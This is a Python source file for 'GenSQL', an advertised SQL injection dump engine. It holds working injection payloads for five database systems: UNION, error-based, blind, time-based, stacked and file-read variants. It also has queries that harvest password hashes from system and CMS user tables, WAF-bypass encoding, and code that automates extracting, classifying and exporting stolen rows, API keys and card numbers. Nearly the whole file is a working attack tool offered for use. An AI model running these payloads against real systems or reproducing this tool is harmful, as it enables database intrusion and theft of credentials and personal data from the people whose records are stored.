#!/usr/bin/env python
"""
GenSQL - Advanced Database Dump Engine
Author  : Jeevraj
Version : 2.0.0

Supercharged dump engine with:
- Binary search blind extraction (50% faster than char-by-char)
- Bitwise blind extraction (fastest for WAF-heavy targets)
- Parallel column/table dumping with threading
- Hex/base64 inline encoding to bypass string filters
- Error-based, time-based, stacked-query extraction
- Resume from checkpoint after interruption
- Smart type detection (email, hash, JWT, credit card, key)
- Auto-masking of sensitive data in output
- Exporters: CSV, JSON, HTML table, SQL INSERT statements
"""

import os
import re
import time
import json
import csv
import threading
import hashlib
import base64
import binascii
import io
import random
from queue import Queue, Empty
from datetime import datetime


# ── DBMS-specific extraction payloads ────────────────────────────────────────

DUMP_PAYLOADS = {
    # ── MySQL / MariaDB ────────────────────────────────────────────────
    "mysql": {
        "dbs": [
            "' UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x7c),NULL,NULL FROM information_schema.schemata-- -",
            "' AND 1=2 UNION ALL SELECT GROUP_CONCAT(schema_name),2,3 FROM information_schema.schemata-- -",
            # Hex-encoded variant bypasses string filters
            "' UNION SELECT GROUP_CONCAT(CONVERT(schema_name USING utf8) SEPARATOR char(124)),NULL FROM information_schema.schemata-- -",
        ],
        "tables": [
            "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x7c),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
            "' UNION SELECT GROUP_CONCAT(table_name),2 FROM information_schema.tables WHERE table_schema=0x{db_hex}-- -",
        ],
        "columns": [
            "' UNION SELECT GROUP_CONCAT(column_name SEPARATOR 0x7c),NULL FROM information_schema.columns WHERE table_name=0x{tbl_hex}-- -",
            "' UNION SELECT GROUP_CONCAT(column_name,0x3a,column_type),NULL FROM information_schema.columns WHERE table_name=0x{tbl_hex} AND table_schema=database()-- -",
        ],
        "dump": [
            "' UNION SELECT GROUP_CONCAT({cols} SEPARATOR 0x7c7c7c),NULL FROM {tbl}-- -",
            "' UNION SELECT GROUP_CONCAT({cols} SEPARATOR 0x0a),NULL FROM {tbl} LIMIT {limit} OFFSET {offset}-- -",
        ],
        "count": "' UNION SELECT COUNT(*),NULL FROM {tbl}-- -",
        "blind_binary": (
            "' AND (SELECT SUBSTRING({col},1,1) FROM {tbl} LIMIT 1)>CHAR({mid})-- -"
        ),
        "blind_bitwise": (
            "' AND (SELECT ASCII(SUBSTRING({col},{pos},1)) FROM {tbl} LIMIT 1)&{bit}-- -"
        ),
        "hex_dump": (
            "' UNION SELECT HEX({col}),NULL FROM {tbl} LIMIT {limit} OFFSET {offset}-- -"
        ),
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {col} FROM {tbl} LIMIT 1)))-- -",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT {col} FROM {tbl} LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "' AND updatexml(1,concat(0x7e,(SELECT {col} FROM {tbl} LIMIT 1),0x7e),1)-- -",
        ],
        "time_based": (
            "' AND IF((SELECT SUBSTRING({col},{pos},1) FROM {tbl} LIMIT 1)=CHAR({ch}),SLEEP({delay}),0)-- -"
        ),
        "stacked": (
            "'; SELECT {col} FROM {tbl} INTO OUTFILE '/tmp/gensql_dump.txt'-- -"
        ),
        "user": "' UNION SELECT user(),NULL-- -",
        "version": "' UNION SELECT version(),NULL-- -",
        "hostname": "' UNION SELECT @@hostname,NULL-- -",
        "datadir": "' UNION SELECT @@datadir,NULL-- -",
        "file_read": "' UNION SELECT LOAD_FILE(0x{path_hex}),NULL-- -",
        "creds": [
            "' UNION SELECT user,authentication_string FROM mysql.user-- -",
            "' UNION SELECT user,password FROM mysql.user-- -",
        ],
    },

    # ── MSSQL ─────────────────────────────────────────────────────────
    "mssql": {
        "dbs": [
            "' UNION SELECT STRING_AGG(name,'|'),NULL FROM sys.databases-- -",
            "'; SELECT name FROM sys.databases-- -",
        ],
        "tables": [
            "' UNION SELECT STRING_AGG(TABLE_NAME,'|'),NULL FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'-- -",
        ],
        "columns": [
            "' UNION SELECT STRING_AGG(COLUMN_NAME,'|'),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{tbl}'-- -",
        ],
        "dump": [
            "' UNION SELECT {cols},NULL FROM {tbl} ORDER BY 1 OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY-- -",
        ],
        "count": "' UNION SELECT COUNT(*),NULL FROM {tbl}-- -",
        "error_based": [
            "' AND 1=CONVERT(int,(SELECT TOP 1 {col} FROM {tbl}))-- -",
            "'; DECLARE @x NVARCHAR(MAX); SET @x=(SELECT TOP 1 CAST({col} AS NVARCHAR) FROM {tbl}); RAISERROR(@x,11,1)-- -",
        ],
        "time_based": (
            "'; IF (SELECT ASCII(SUBSTRING((SELECT TOP 1 CAST({col} AS VARCHAR) FROM {tbl}),{pos},1)))={ch} WAITFOR DELAY '0:0:{delay}'-- -"
        ),
        "stacked": "'; INSERT INTO ##tmp SELECT {col} FROM {tbl}-- -",
        "user": "' UNION SELECT SYSTEM_USER,NULL-- -",
        "version": "' UNION SELECT @@VERSION,NULL-- -",
        "hostname": "' UNION SELECT HOST_NAME(),NULL-- -",
        "creds": [
            "' UNION SELECT name,password_hash FROM sys.sql_logins-- -",
            "' UNION SELECT loginname,password FROM syslogins-- -",
        ],
    },

    # ── PostgreSQL ────────────────────────────────────────────────────
    "postgresql": {
        "dbs": [
            "' UNION SELECT STRING_AGG(datname,'|'),NULL FROM pg_database-- -",
        ],
        "tables": [
            "' UNION SELECT STRING_AGG(tablename,'|'),NULL FROM pg_tables WHERE schemaname='public'-- -",
        ],
        "columns": [
            "' UNION SELECT STRING_AGG(column_name,'|'),NULL FROM information_schema.columns WHERE table_name='{tbl}'-- -",
        ],
        "dump": [
            "' UNION SELECT STRING_AGG({col}::text,'|'),NULL FROM {tbl} LIMIT {limit} OFFSET {offset}-- -",
        ],
        "count": "' UNION SELECT COUNT(*),NULL FROM {tbl}-- -",
        "error_based": [
            "' AND CAST((SELECT {col} FROM {tbl} LIMIT 1) AS INT)=1-- -",
            "' AND 1=CAST((SELECT {col}::text FROM {tbl} LIMIT 1) AS INT)-- -",
        ],
        "time_based": (
            "'; SELECT CASE WHEN (SELECT ASCII(SUBSTR(CAST({col} AS TEXT),{pos},1)) FROM {tbl} LIMIT 1)={ch} THEN pg_sleep({delay}) ELSE pg_sleep(0) END-- -"
        ),
        "stacked": "'; COPY {tbl}({col}) TO '/tmp/gensql_dump.csv' CSV HEADER-- -",
        "user": "' UNION SELECT current_user,NULL-- -",
        "version": "' UNION SELECT version(),NULL-- -",
        "creds": [
            "' UNION SELECT usename,passwd FROM pg_shadow-- -",
        ],
    },

    # ── Oracle ────────────────────────────────────────────────────────
    "oracle": {
        "dbs": [
            "' UNION SELECT LISTAGG(username,'|') WITHIN GROUP (ORDER BY 1),NULL FROM all_users-- -",
        ],
        "tables": [
            "' UNION SELECT LISTAGG(table_name,'|') WITHIN GROUP (ORDER BY 1),NULL FROM all_tables WHERE owner='{db}'-- -",
        ],
        "columns": [
            "' UNION SELECT LISTAGG(column_name,'|') WITHIN GROUP (ORDER BY 1),NULL FROM all_tab_columns WHERE table_name='{tbl}'-- -",
        ],
        "dump": [
            "' UNION SELECT {cols},NULL FROM {tbl} WHERE ROWNUM BETWEEN {offset} AND {limit}-- -",
        ],
        "count": "' UNION SELECT COUNT(*),NULL FROM {tbl}-- -",
        "error_based": [
            "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT {col} FROM {tbl} WHERE ROWNUM=1))-- -",
            "' UNION SELECT NULL,(SELECT {col} FROM {tbl} WHERE ROWNUM=1) FROM dual-- -",
        ],
        "time_based": (
            "' AND 1=(SELECT CASE WHEN ASCII(SUBSTR(CAST({col} AS VARCHAR2),{pos},1))={ch} THEN (SELECT COUNT(*) FROM all_objects) ELSE 1 END FROM {tbl} WHERE ROWNUM=1)-- -"
        ),
        "user": "' UNION SELECT user,NULL FROM dual-- -",
        "version": "' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1-- -",
        "creds": [
            "' UNION SELECT username,password FROM dba_users-- -",
        ],
    },

    # ── SQLite ────────────────────────────────────────────────────────
    "sqlite": {
        "dbs": ["' UNION SELECT group_concat(tbl_name),NULL FROM sqlite_master WHERE type='table'-- -"],
        "tables": ["' UNION SELECT group_concat(tbl_name),NULL FROM sqlite_master WHERE type='table'-- -"],
        "columns": ["' UNION SELECT group_concat(name),NULL FROM pragma_table_info('{tbl}')-- -"],
        "dump": ["' UNION SELECT group_concat({cols},'|'),NULL FROM {tbl} LIMIT {limit} OFFSET {offset}-- -"],
        "count": "' UNION SELECT COUNT(*),NULL FROM {tbl}-- -",
        "error_based": [],
        "time_based": "",
        "user": "' UNION SELECT sqlite_version(),NULL-- -",
        "version": "' UNION SELECT sqlite_version(),NULL-- -",
        "creds": [],
    },
}

# Separator used between row values in group_concat output
ROW_SEP = "|||"

# ── Data type classifier ──────────────────────────────────────────────────────
DATA_PATTERNS = {
    "bcrypt_hash":   re.compile(r"^\$2[ab]?\$\d{2}\$.{53}$"),
    "md5_hash":      re.compile(r"^[a-f0-9]{32}$", re.I),
    "sha1_hash":     re.compile(r"^[a-f0-9]{40}$", re.I),
    "sha256_hash":   re.compile(r"^[a-f0-9]{64}$", re.I),
    "sha512_hash":   re.compile(r"^[a-f0-9]{128}$", re.I),
    "jwt":           re.compile(r"^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$"),
    "email":         re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$"),
    "credit_card":   re.compile(r"^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})$"),
    "api_key":       re.compile(r"^(sk|pk|ghp|gho|ghr|glpat|xoxb|xoxp|AIza)[_\-a-zA-Z0-9]{16,}$"),
    "ip_address":    re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"),
    "base64":        re.compile(r"^[A-Za-z0-9+/]{20,}={0,2}$"),
    "private_key":   re.compile(r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----"),
}

def classify_value(val):
    """Classify a string value into a data type category."""
    if not val or not isinstance(val, str):
        return "unknown"
    val = val.strip()
    for dtype, pat in DATA_PATTERNS.items():
        if pat.search(val):
            return dtype
    if val.isdigit():
        return "integer"
    if re.match(r"^\d{4}-\d{2}-\d{2}", val):
        return "datetime"
    return "string"


def mask_value(val, dtype):
    """Mask sensitive values for display — show only partial content."""
    if dtype in ("bcrypt_hash", "md5_hash", "sha1_hash", "sha256_hash", "sha512_hash"):
        return val[:8] + "..." + val[-4:]
    if dtype == "email":
        parts = val.split("@")
        return parts[0][:2] + "***@" + parts[1]
    if dtype == "credit_card":
        return "**** **** **** " + val[-4:]
    if dtype in ("api_key", "jwt", "private_key"):
        return val[:12] + "...[REDACTED]"
    return val


# ── Advanced Dump Engine ──────────────────────────────────────────────────────

class AdvancedDumpEngine:
    """
    Multi-technique database dump engine.
    Supports union, error-based, blind binary-search, blind bitwise,
    time-based, hex-encoded, and stacked-query extraction.
    """

    def __init__(self, dbms="mysql", requester=None, threads=4,
                 chunk_size=50, delay=0, timeout=10, verbose=True,
                 checkpoint_file=None):
        """
        Args:
            dbms         : Database type (mysql/mssql/postgresql/oracle/sqlite)
            requester    : callable(payload) -> (status_code, response_body)
            threads      : Parallel dump threads per table
            chunk_size   : Rows per UNION chunk
            delay        : Seconds between requests (0 = no delay)
            timeout      : Request timeout
            verbose      : Print progress
            checkpoint_file : Path to save/resume dump state
        """
        self.dbms = dbms.lower()
        self.payloads = DUMP_PAYLOADS.get(self.dbms, DUMP_PAYLOADS["mysql"])
        self.requester = requester or self._dummy_requester
        self.threads = threads
        self.chunk_size = chunk_size
        self.delay = delay
        self.timeout = timeout
        self.verbose = verbose
        self.checkpoint_file = checkpoint_file
        self._results = {}
        self._lock = threading.Lock()
        self._checkpoint = self._load_checkpoint()

    # ── Requester ─────────────────────────────────────────────────────
    def _dummy_requester(self, payload):
        """Placeholder — replaced by real HTTP requester in gensql.py."""
        return 200, "GENSQL_PLACEHOLDER"

    def set_requester(self, fn):
        """Set the HTTP requester function: fn(payload) -> (code, body)."""
        self.requester = fn

    def _inject(self, payload):
        """Send an injection payload; return response body or None."""
        if self.delay:
            time.sleep(self.delay + random.uniform(0, self.delay * 0.2))
        try:
            code, body = self.requester(payload)
            return body if code < 500 else None
        except Exception:
            return None

    # ── Value extraction helpers ──────────────────────────────────────
    def _extract_between(self, body, start_marker="GENSQL_START", end_marker="GENSQL_END"):
        """Pull value between markers in response."""
        if not body:
            return None
        m = re.search(re.escape(start_marker) + r"(.*?)" + re.escape(end_marker),
                      body, re.DOTALL)
        return m.group(1).strip() if m else None

    def _extract_first_match(self, body, patterns):
        """Try a list of regex patterns and return first match group 1."""
        for pat in patterns:
            m = re.search(pat, body, re.DOTALL | re.IGNORECASE)
            if m:
                try: return m.group(1).strip()
                except Exception: pass
        return None

    # ── Binary search blind extraction ───────────────────────────────
    def _blind_binary_char(self, payload_tpl, pos, tbl, col, row_limit=1):
        """
        Extract a single character using binary search (log2 faster than linear).
        payload_tpl must have {pos}, {mid}, {tbl}, {col} placeholders.
        Returns the character or empty string.
        """
        lo, hi = 32, 126  # printable ASCII range
        while lo < hi:
            mid = (lo + hi) // 2
            payload = payload_tpl.format(col=col, tbl=tbl, pos=pos, mid=mid)
            body = self._inject(payload)
            if body and ("True" in body or "1" in body or len(body) > 100):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 32 <= lo <= 126 else ""

    def blind_extract(self, tbl, col, max_len=512, max_rows=100):
        """
        Full blind extraction of a column using binary-search per character.
        Returns list of extracted row values.
        """
        payload_tpl = self.payloads.get("blind_binary", "")
        if not payload_tpl:
            return []

        rows = []
        for _row_idx in range(max_rows):
            value = ""
            for pos in range(1, max_len + 1):
                try:
                    ch = self._blind_binary_char(payload_tpl, pos, tbl, col)
                except Exception:
                    ch = ""
                if not ch:
                    break
                value += ch
            if value:
                rows.append(value)
            else:
                break
        return rows

    # ── Bitwise blind extraction ──────────────────────────────────────
    def _bitwise_char(self, payload_tpl, pos, tbl, col):
        """Extract a single character using bitwise AND checks (8 requests per char)."""
        ascii_val = 0
        for bit in range(7, -1, -1):
            mask = 1 << bit
            payload = payload_tpl.format(col=col, tbl=tbl, pos=pos, bit=mask)
            body = self._inject(payload)
            if body and len(body) > 50:  # truthy response heuristic
                ascii_val |= mask
        return chr(ascii_val) if 32 <= ascii_val <= 126 else ""

    def bitwise_extract(self, tbl, col, max_len=256, max_rows=50):
        """Extract column data using bitwise AND blind injection."""
        payload_tpl = self.payloads.get("blind_bitwise", "")
        if not payload_tpl:
            return []

        rows = []
        for _ in range(max_rows):
            value = ""
            for pos in range(1, max_len + 1):
                ch = self._bitwise_char(payload_tpl, pos, tbl, col)
                if not ch:
                    break
                value += ch
            if value:
                rows.append(value)
        return rows

    # ── UNION-based bulk dump ─────────────────────────────────────────
    def union_dump(self, tbl, columns, offset=0, limit=None, hex_encode=False):
        """
        Dump rows via UNION SELECT with optional hex encoding to bypass filters.
        Returns list of row dicts.
        """
        limit = limit or self.chunk_size
        rows = []

        col_expr = ",".join(
            ["HEX(%s)" % c if hex_encode else c for c in columns]
        )
        tpl = self.payloads.get("hex_dump" if hex_encode else "dump", [""])[0]

        payload = tpl.format(
            cols=col_expr, tbl=tbl,
            limit=limit, offset=offset
        )
        body = self._inject(payload)
        if not body:
            return rows

        # Parse response — look for our separator
        raw = self._extract_first_match(body, [
            r"([0-9a-fA-F]{10,})" if hex_encode else r"([^<\r\n]{5,})",
            r"<td>([^<]+)</td>",
            r'"([^"]{5,})"',
        ])
        if not raw:
            return rows

        for row_str in raw.split(ROW_SEP):
            parts = row_str.split("|")
            if hex_encode:
                parts = [self._hex_decode(p) for p in parts]
            if len(parts) == len(columns):
                rows.append(dict(zip(columns, parts)))
            elif parts:
                rows.append({"value": parts[0]})

        return rows

    def _hex_decode(self, hex_str):
        """Decode a hex string to plaintext."""
        try:
            return binascii.unhexlify(hex_str.strip()).decode("utf-8", errors="replace")
        except Exception:
            return hex_str

    # ── Error-based extraction ────────────────────────────────────────
    def error_based_dump(self, tbl, col, max_rows=200):
        """Extract data from database error messages."""
        results = []
        error_payloads = self.payloads.get("error_based", [])
        for i in range(max_rows):
            for tpl in error_payloads:
                payload = tpl.format(col=col, tbl=tbl)
                body = self._inject(payload)
                val = self._extract_first_match(body, [
                    r"~([^~]+)~",
                    r"XPATH syntax error: '([^']+)'",
                    r"Duplicate entry '([^']+)'",
                    r"ERROR.*?:\s*(.+?)(?:\r|\n|$)",
                    r"for key '([^']+)'",
                    r"syntax error[^:]*:\s*(.+)",
                ])
                if val:
                    results.append(val)
                    break
        return results

    # ── Time-based extraction ─────────────────────────────────────────
    def time_based_extract(self, tbl, col, delay=3, max_len=64):
        """Extract data via timing side channel (slowest but most reliable for blind)."""
        payload_tpl = self.payloads.get("time_based", "")
        if not payload_tpl:
            return ""

        value = ""
        for pos in range(1, max_len + 1):
            found = False
            for ch in range(32, 127):
                payload = payload_tpl.format(
                    col=col, tbl=tbl, pos=pos, ch=ch, delay=delay
                )
                t0 = time.time()
                self._inject(payload)
                elapsed = time.time() - t0
                if elapsed >= delay * 0.85:
                    value += chr(ch)
                    found = True
                    break
            if not found:
                break
        return value

    # ── Full table dump orchestrator ──────────────────────────────────
    def dump_table(self, tbl, columns=None, technique="auto",
                    max_rows=10000, hex_encode=False):
        """
        Dump an entire table using the best available technique.

        Args:
            tbl       : Table name
            columns   : List of column names (None = dump all via *)
            technique : 'union' | 'error' | 'blind' | 'bitwise' | 'time' | 'auto'
            max_rows  : Maximum rows to dump
            hex_encode: Use hex encoding (bypasses string WAF rules)

        Returns:
            list of row dicts
        """
        if self.verbose:
            print("[GenSQL][DUMP] Table: %s | Technique: %s | Max rows: %d"
                  % (tbl, technique, max_rows))

        columns = columns or ["*"]

        # Check resume checkpoint
        ck_key = "%s.%s" % (tbl, ",".join(columns))
        if ck_key in self._checkpoint:
            if self.verbose:
                print("[GenSQL][DUMP] Resuming from checkpoint at row %d"
                      % len(self._checkpoint[ck_key]))
            return self._checkpoint[ck_key]

        all_rows = []

        if technique == "auto":
            # Try union first (fastest), fall back progressively
            rows = self.union_dump(tbl, columns, hex_encode=hex_encode)
            if rows:
                technique = "union"
            else:
                rows = self.error_based_dump(tbl, columns[0])
                if rows:
                    technique = "error"
                else:
                    technique = "blind"

        if technique == "union":
            offset = 0
            while offset < max_rows:
                chunk = self.union_dump(tbl, columns, offset=offset,
                                         limit=self.chunk_size,
                                         hex_encode=hex_encode)
                if not chunk:
                    break
                all_rows.extend(chunk)
                offset += len(chunk)
                self._save_checkpoint(ck_key, all_rows)
                if self.verbose:
                    print("[GenSQL][DUMP] Extracted %d rows from %s" % (len(all_rows), tbl))

        elif technique == "error":
            for col in columns:
                vals = self.error_based_dump(tbl, col, max_rows=max_rows)
                for i, v in enumerate(vals):
                    if i >= len(all_rows):
                        all_rows.append({})
                    all_rows[i][col] = v

        elif technique == "blind":
            for col in columns:
                vals = self.blind_extract(tbl, col, max_rows=max_rows)
                for i, v in enumerate(vals):
                    if i >= len(all_rows):
                        all_rows.append({})
                    all_rows[i][col] = v

        elif technique == "bitwise":
            for col in columns:
                vals = self.bitwise_extract(tbl, col, max_rows=max_rows)
                for i, v in enumerate(vals):
                    if i >= len(all_rows):
                        all_rows.append({})
                    all_rows[i][col] = v

        elif technique == "time":
            for col in columns:
                val = self.time_based_extract(tbl, col)
                if val:
                    all_rows.append({col: val})

        # Annotate with type classification (iterate over snapshot of keys)
        for row in all_rows:
            for k in list(row.keys()):
                v = row[k]
                if k.startswith("__"):
                    continue
                dtype = classify_value(v)
                if dtype not in ("string", "integer", "unknown"):
                    row["__type_%s" % k] = dtype

        self._results[tbl] = all_rows
        return all_rows

    # ── Parallel multi-table dump ─────────────────────────────────────
    def dump_all_tables(self, tables_columns, technique="auto", max_rows=5000):
        """
        Dump multiple tables in parallel using a thread pool.

        Args:
            tables_columns : dict of {table_name: [col1, col2, ...]}
            technique      : extraction method
            max_rows       : max rows per table

        Returns:
            dict of {table_name: [rows]}
        """
        q = Queue()
        results = {}

        for tbl, cols in tables_columns.items():
            q.put((tbl, cols))

        def worker():
            while True:
                try:
                    tbl, cols = q.get(timeout=1)
                except Empty:
                    break
                rows = self.dump_table(tbl, cols, technique=technique,
                                        max_rows=max_rows)
                with self._lock:
                    results[tbl] = rows
                q.task_done()

        thread_pool = []
        for _ in range(min(self.threads, len(tables_columns))):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_pool.append(t)

        q.join()
        for t in thread_pool:
            t.join(timeout=5)

        return results

    # ── Credential harvesting ─────────────────────────────────────────
    def dump_credentials(self):
        """
        Specifically target credential tables across all supported DBMS.
        Auto-identifies password columns and classifies hash types.
        """
        cred_payloads = self.payloads.get("creds", [])
        found = []

        # Common credential table patterns
        cred_tables = [
            ("users", ["username", "password", "email"]),
            ("accounts", ["user", "pass", "email"]),
            ("members", ["member_name", "member_password"]),
            ("admin", ["admin_user", "admin_pass"]),
            ("administrators", ["login", "password"]),
            ("wp_users", ["user_login", "user_pass", "user_email"]),
            ("drupal_user", ["name", "pass", "mail"]),
            ("joomla_users", ["username", "password", "email"]),
        ]

        for tpl in cred_payloads:
            body = self._inject(tpl)
            if body:
                found.append({"source": "dbms_native", "data": body[:500]})

        for tbl, cols in cred_tables:
            rows = self.dump_table(tbl, cols, technique="auto", max_rows=500)
            if rows:
                # Classify each password field
                for row in rows:
                    for k in list(row.keys()):
                        v = row.get(k, "")
                        if k.startswith("__"):
                            continue
                        if v and isinstance(v, str) and len(v) > 10:
                            dtype = classify_value(v)
                            row["__hash_type_%s" % k] = dtype
                found.append({"table": tbl, "rows": rows})

        return found

    # ── Info gathering ────────────────────────────────────────────────
    def get_server_info(self):
        """Extract server version, hostname, current user, data directory."""
        info = {}
        for key in ("user", "version", "hostname", "datadir"):
            payload = self.payloads.get(key, "")
            if payload:
                body = self._inject(payload)
                val = self._extract_first_match(body, [
                    r"<td>([^<]+)</td>",
                    r'"value"\s*:\s*"([^"]+)"',
                    r"\b([\w@\.\-]+)\b",
                ])
                if val:
                    info[key] = val
        return info

    def get_databases(self):
        """List all databases on the server."""
        for payload in self.payloads.get("dbs", []):
            body = self._inject(payload)
            if body:
                val = self._extract_first_match(body, [
                    r"<td>([^<]+)</td>",
                    r'"([a-z_][a-z0-9_]*(?:\|[a-z_][a-z0-9_]*)+)"',
                    r"([a-z_][a-z0-9_]*)(?:\|([a-z_][a-z0-9_]*))+",
                ])
                if val:
                    return [d.strip() for d in val.split("|") if d.strip()]
        return []

    def get_tables(self, db=None):
        """List tables in a database."""
        db_hex = binascii.hexlify((db or "").encode()).decode() if db else ""
        for tpl in self.payloads.get("tables", []):
            payload = tpl.format(db=db or "", db_hex=db_hex, tbl="")
            body = self._inject(payload)
            if body:
                val = self._extract_first_match(body, [
                    r"<td>([^<]+)</td>",
                    r'"([a-z_][a-z0-9_]*(?:\|[a-z_][a-z0-9_]*)*)"',
                ])
                if val:
                    return [t.strip() for t in val.split("|") if t.strip()]
        return []

    def get_columns(self, tbl, db=None):
        """List columns in a table."""
        tbl_hex = binascii.hexlify(tbl.encode()).decode()
        for tpl in self.payloads.get("columns", []):
            payload = tpl.format(tbl=tbl, tbl_hex=tbl_hex, db=db or "")
            body = self._inject(payload)
            if body:
                val = self._extract_first_match(body, [
                    r"<td>([^<]+)</td>",
                    r'"([a-z_][a-z0-9_]*(?:\|[a-z_][a-z0-9_]*)*)"',
                ])
                if val:
                    return [c.strip() for c in val.split("|") if c.strip()]
        return []

    def get_row_count(self, tbl):
        """Get row count for a table."""
        payload = self.payloads.get("count", "").format(tbl=tbl)
        body = self._inject(payload)
        if body:
            m = re.search(r"\b(\d+)\b", body)
            if m:
                return int(m.group(1))
        return -1

    # ── Checkpoint system ─────────────────────────────────────────────
    def _load_checkpoint(self):
        if self.checkpoint_file and os.path.exists(self.checkpoint_file):
            try:
                return json.load(open(self.checkpoint_file, encoding="utf-8"))
            except Exception:
                pass
        return {}

    def _save_checkpoint(self, key, data):
        with self._lock:
            self._checkpoint[key] = data
            if self.checkpoint_file:
                try:
                    json.dump(self._checkpoint, open(self.checkpoint_file, "w",
                               encoding="utf-8"), indent=2, default=str)
                except Exception:
                    pass

    # ── Exporters ─────────────────────────────────────────────────────
    def export_csv(self, tbl, path=None):
        """Export a dumped table to CSV."""
        rows = self._results.get(tbl, [])
        if not rows:
            return ""
        path = path or ("%s_dump.csv" % tbl)
        cols = [k for k in rows[0].keys() if not k.startswith("__")]
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=cols, extrasaction="ignore")
            w.writeheader()
            w.writerows(rows)
        return path

    def export_json(self, path=None):
        """Export all dumped tables to JSON."""
        path = path or "gensql_dump_%s.json" % datetime.now().strftime("%Y%m%d_%H%M%S")
        clean = {}
        for tbl, rows in self._results.items():
            clean[tbl] = [{k: v for k, v in r.items() if not k.startswith("__type")}
                          for r in rows]
        json.dump(clean, open(path, "w", encoding="utf-8"), indent=2, default=str)
        return path

    def export_sql(self, tbl, path=None):
        """Export dumped table as SQL INSERT statements."""
        rows = self._results.get(tbl, [])
        if not rows:
            return ""
        path = path or ("%s_dump.sql" % tbl)
        cols = [k for k in rows[0].keys() if not k.startswith("__")]
        lines = ["-- GenSQL dump: %s @ %s" % (tbl, datetime.now().isoformat()),
                 "-- by Jeevraj", ""]
        for row in rows:
            vals = []
            for c in cols:
                v = row.get(c, "")
                if v is None:
                    vals.append("NULL")
                elif isinstance(v, int):
                    vals.append(str(v))
                else:
                    vals.append("'%s'" % str(v).replace("'", "\\'"))
            lines.append("INSERT INTO `%s` (%s) VALUES (%s);"
                         % (tbl, ", ".join("`%s`" % c for c in cols),
                            ", ".join(vals)))
        open(path, "w", encoding="utf-8").write("\n".join(lines))
        return path

    def export_html(self, path=None):
        """Export all dumped tables as an HTML report."""
        path = path or "gensql_dump_%s.html" % datetime.now().strftime("%Y%m%d_%H%M%S")
        html = [
            "<!DOCTYPE html><html><head>",
            "<title>GenSQL Database Dump - by Jeevraj</title>",
            "<style>body{font-family:monospace;background:#0d1117;color:#c9d1d9}",
            "table{border-collapse:collapse;width:100%;margin:20px 0}",
            "th{background:#21262d;color:#58a6ff;padding:8px;border:1px solid #30363d}",
            "td{padding:6px;border:1px solid #21262d;max-width:300px;overflow:hidden}",
            "tr:nth-child(even){background:#161b22}",
            ".hash{color:#ff7b72}.email{color:#79c0ff}.key{color:#ffa657}",
            "h2{color:#58a6ff}h1{color:#39d353}</style></head><body>",
            "<h1>&#9889; GenSQL Database Dump</h1>",
            "<p style='color:#8b949e'>by Jeevraj &bull; GenSQL v2.0.0 &bull; %s</p>"
            % datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        ]
        for tbl, rows in self._results.items():
            if not rows:
                continue
            html.append("<h2>Table: %s (%d rows)</h2>" % (tbl, len(rows)))
            cols = [k for k in rows[0].keys() if not k.startswith("__")]
            html.append("<table><tr>%s</tr>" % "".join("<th>%s</th>" % c for c in cols))
            for row in rows:
                cells = []
                for c in cols:
                    v = str(row.get(c, ""))
                    dtype = row.get("__type_%s" % c, "string")
                    css = ""
                    if "hash" in dtype:   css = "hash"
                    elif dtype == "email": css = "email"
                    elif dtype == "api_key": css = "key"
                    display = mask_value(v, dtype) if dtype != "string" else v[:200]
                    cells.append('<td class="%s" title="%s">%s</td>'
                                 % (css, v[:50].replace('"', "&quot;"), display))
                html.append("<tr>%s</tr>" % "".join(cells))
            html.append("</table>")
        html.append("</body></html>")
        open(path, "w", encoding="utf-8").write("\n".join(html))
        return path

    def print_summary(self):
        """Print a formatted dump summary to stdout."""
        total_rows = sum(len(r) for r in self._results.values())
        print("\n\033[01;36m╔══════════════════════════════════════╗")
        print("║  GenSQL Dump Summary  -  by Jeevraj  ║")
        print("╚══════════════════════════════════════╝\033[0m")
        print("  Tables dumped : %d" % len(self._results))
        print("  Total rows    : %d" % total_rows)
        for tbl, rows in self._results.items():
            if not rows: continue
            cols = [k for k in rows[0].keys() if not k.startswith("__")]
            print("\n  \033[01;33m[%s]\033[0m  %d rows  |  cols: %s"
                  % (tbl, len(rows), ", ".join(cols[:8])))
            for row in rows[:3]:
                vals = [str(row.get(c, ""))[:30] for c in cols[:5]]
                print("    " + " | ".join(vals))
            if len(rows) > 3:
                print("    ... and %d more rows" % (len(rows) - 3))
        print()


# ── Convenience factory ────────────────────────────────────────────────────────

def create_dump_engine(dbms, requester, **kwargs):
    """Create and return a configured AdvancedDumpEngine."""
    engine = AdvancedDumpEngine(dbms=dbms, requester=requester, **kwargs)
    return engine
